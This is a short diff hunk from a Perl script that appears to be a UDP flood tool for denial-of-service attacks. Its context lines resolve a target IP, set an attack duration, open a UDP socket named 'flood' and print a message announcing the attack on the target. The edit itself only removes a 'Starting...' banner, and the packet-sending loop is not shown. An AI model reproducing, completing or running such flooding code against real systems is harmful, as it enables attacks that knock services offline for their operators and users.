@@ -13,11 +13,6 @@ my ($iaddr,$endtime,$psize,$pport);
 $iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
 $endtime = time() + ($time ? $time : 100);
 socket(flood, PF_INET, SOCK_DGRAM, 17);
- 
- 
-print <<EOTEXT;
-Starting...
-EOTEXT
      
 print "~You are attacking the ip: $ip " . ($port ? $port : "random") . " With " .
 ($size ? "$size-byte" : "Smacked With A Large Packets?") . " " .
